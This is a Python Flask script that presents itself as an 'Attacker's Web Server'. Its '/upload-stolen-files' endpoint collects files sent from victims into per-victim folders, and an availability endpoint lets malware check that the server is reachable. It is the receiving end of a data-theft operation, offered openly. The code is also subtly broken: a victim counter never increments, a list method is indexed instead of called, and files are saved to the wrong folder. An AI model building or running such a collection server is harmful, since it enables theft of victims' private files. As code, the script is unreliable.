from flask import Flask, flash, request, jsonify
import os

# Initialise Flask app
app = Flask(__name__)

# Folder to upload in windows
UPLOAD_FOLDER = 'captured/'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

victim_index = 1

@app.route('/upload-stolen-files', methods=['POST'])
def upload_stolen_file():
    while True:
        victim_dir = os.path.join(UPLOAD_FOLDER, f"victim-{victim_index}/")
        if not os.path.exists(victim_dir):
            os.makedirs(victim_dir)
            break
        else:
            victim_index + 1
    # Check if POST request has the file part
    if 'files[]' not in request.files:
        flash('No file part')
        return jsonify({'error': 'No file part'}), 400
    
    files = request.files.getlist['files[]']
    if not files:
        flash('No selected files')
        return jsonify({'error': 'No selected files (n)'}), 400

    for file in files:
        if file.filename == '':
            return jsonify({'error': 'No selected file (1)'}), 400
        file.save(os.path.join(UPLOAD_FOLDER, file.filename))
    return jsonify({'success': f'Files uploaded successfully to directory {victim_dir}'}), 200

@app.route('/check-availability', methods=['GET', 'HEAD'])
def check_availability():
    if request.method == 'GET':
        return '''
        <!doctype html>
        <title>Attacker's Web Server</title>
        <body>Server Found</body>
        '''
    return

if __name__ == '__main__':
    # Debugging
    app.run(host='0.0.0.0', port=5000)
#Specify port
#Allow port through firewall